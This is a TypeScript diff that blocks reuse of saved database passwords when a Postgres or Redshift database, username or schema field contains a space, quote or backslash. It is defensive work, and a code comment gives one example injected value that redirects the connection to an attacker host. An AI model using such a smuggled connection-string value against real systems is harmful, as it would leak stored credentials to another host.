@@ -153,6 +153,10 @@ export function unmaskSecretsFromOriginal(object: any, dbEntity: any, comparedWi
   const changedTargets = changedConnectionTargets(object, comparedWith);
   // Only signing keys masked (webhook signatureSecret): they sign requests and are never sent to the target
   const onlySigningKeysMasked = maskedPaths(object).every(path => SIGNING_KEY.test(String(path[path.length - 1])));
+  const breakers = connectionStringBreakers(object, comparedWith);
+  if (breakers.length > 0 && !onlySigningKeysMasked && containsMaskedSecrets(object)) {
+    throw new ApiError(connectionStringError(breakers), { status: 400 });
+  }
   if (changedTargets.length > 0 && !onlySigningKeysMasked) {
     // Restoring the stored password into a config that points somewhere else would send it to that host
     throw new ApiError(
@@ -232,6 +236,32 @@ function findChangedTargets(
   });
 }
 
+// Bulker builds the Postgres (and Redshift) connection string as `host=.. dbname=.. user=.. password=.. search_path=..`
+// without quoting, so a space in one of these values starts a new setting: `database: "events host=attacker.example"`
+// connects to that host with the stored password even though `host` itself is unchanged.
+const CONNECTION_STRING_FIELDS: Record<string, string[]> = {
+  postgres: ["database", "username", "defaultSchema"],
+  redshift: ["database", "username", "defaultSchema"],
+};
+const CONNECTION_STRING_BREAKER = /[\s'\\]/;
+
+/** Fields of a Postgres or Redshift destination whose value would split or quote the connection string. */
+export function connectionStringBreakers(...objects: any[]): string[] {
+  const type = objects.map(o => o?.destinationType).find(t => t in CONNECTION_STRING_FIELDS);
+  if (!type) {
+    return [];
+  }
+  const object = objects[0];
+  return CONNECTION_STRING_FIELDS[type].filter(
+    field => typeof object?.[field] === "string" && CONNECTION_STRING_BREAKER.test(object[field])
+  );
+}
+
+const connectionStringError = (fields: string[]) =>
+  `Cannot reuse saved secrets because ${fields.join(
+    ", "
+  )} contains a space, quote or backslash, which would change the connection. Enter the secret values again to continue.`;
+
 // Secrets that are used to sign requests and are never sent to the connection target
 const SIGNING_KEY = /signature|signing|hmac/i;
 
@@ -296,7 +326,8 @@ function targetFieldsBetween(
  */
 export function assertSecretsStayWithTarget(original: any, patch: any, merged: any, secretPaths: string[]): void {
   const changed = changedTargetFieldsBetween(merged, original);
-  if (changed.length === 0) {
+  const breakers = connectionStringBreakers(merged, original);
+  if (changed.length === 0 && breakers.length === 0) {
     return;
   }
   const keptSecrets = secretPaths.filter(path => {
@@ -312,10 +343,14 @@ export function assertSecretsStayWithTarget(original: any, patch: any, merged: a
     return isEmptyValue(supplied) || supplied === MASKED_SECRET;
   });
   if (keptSecrets.length > 0) {
+    const reason =
+      changed.length > 0
+        ? `${changed.join(", ")} changed`
+        : `${breakers.join(", ")} contains a space, quote or backslash, which would change the connection`;
     throw new ApiError(
-      `Cannot keep the saved secrets (${keptSecrets.join(", ")}) because ${changed.join(
+      `Cannot keep the saved secrets (${keptSecrets.join(
         ", "
-      )} changed. Enter the secret values again to continue.`,
+      )}) because ${reason}. Enter the secret values again to continue.`,
       { status: 400 }
     );
   }
